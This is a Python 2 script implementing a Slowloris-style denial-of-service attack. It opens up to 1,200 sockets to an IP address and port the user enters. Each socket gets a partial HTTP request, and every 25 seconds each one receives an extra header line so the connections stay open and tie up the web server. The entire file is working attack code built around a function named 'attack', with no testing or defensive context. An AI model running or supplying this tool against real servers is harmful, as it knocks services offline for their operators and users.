import socket
from time import sleep
from threading import Thread
from random import random
from sys import argv

headers=["Accept: text/plain", "User Agent: Mozilla/5.0 (X11; U; Linux x86_64)"]
message="X-a: b\r\n"
'''Upper limit of the number of sockets'''
sock_limit=1200

'''Contains all the sockets'''

list_of_socks=[]
failed_attempts=0


dead_thread=False
def get_headers():
	header=["GET /{} HTTP/1.1".format(random())] + headers
	return "\r\n".join(header)


def gen_socket(target, port=80, encoding='utf-8'):
	global failed_attempts
	try:
		sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((target, port))
		sock.send(get_headers().encode(encoding))
		sock.send(message.encode(encoding))
		list_of_socks.append(sock)
	except Exception as exception:
		print "Exception occurred as follows: ", exception
		print "Connection failed!"
		failed_attempts+=1
		if failed_attempts >=5:
			print ("More than 5 failed attemps. Exiting...")
			exit()
		else:
			sleep(2)

'''We need to keep adding sockets until we reach the limit'''
'''Constructor is required'''
class Sock(Thread):


	def __init__(self, target, port, encoding):
		Thread.__init__(self)
		self.target=target
		self.port=port
		self.encoding=encoding
		self.count=1
	def run(self):
		global dead_thread
		try:
			while (True):
				while (len(list_of_socks) < sock_limit):
					gen_socket(self.target, self.port, self.encoding)
					self.count+=1
					if self.count >= 15:
					##	print ('The number of sockets connected is greater than 15')
						print "Connected to {} sockets".format(len(list_of_socks))
						self.count=0
					if dead_thread:
						raise KeyboardInterrupt
		except KeyboardInterrupt:
			print ('Keyboard Interrupt')
			for item in list_of_socks:
				item.close()
			exit()


def attack(target, port=80, encoding='utf-8'):
	global dead_thread
	global failed_attempts
	
	t=Sock(target, port, encoding)
	t.start()
	try:
		sleep(5)
		print ("Waiting for 5 seconds")
		'''To do: This is ugly code. Try to change it later'''
		while (True):
			count=0
			send_to=0
			for s in list_of_socks:
				if (failed_attempts>5):
					break
				try:
					s.send(message.encode(encoding))
					send_to+=1
				except Exception as e:
					print ("Exception occured. Removing socket {}".format(count))
					del list_of_socks[count]
					count-=1
				count+=1
			print ("Sending data to {} sockets...done.".format(send_to))
			sleep(25)
	except KeyboardInterrupt:
		print ("Received keyboard interrupt. Exiting...")
	dead_thread=True
	t.join()

if __name__=='__main__':
	target='192.168.1.4'
	port='80'
	encoding='utf-8'
	print "Enter the IP address of the target: "
	target=raw_input()
	if (target==''):
		target='192.168.1.4'
	print "Enter the port number (default port is 80)"
	port= raw_input()
	if port != '':
		port=int(port)
	else:
		port=80
	print "Enter the type of encoding (default is UTF-8)"
	encoding=raw_input()
	if encoding =='':
		encoding='utf-8'
	attack(target, port, encoding)
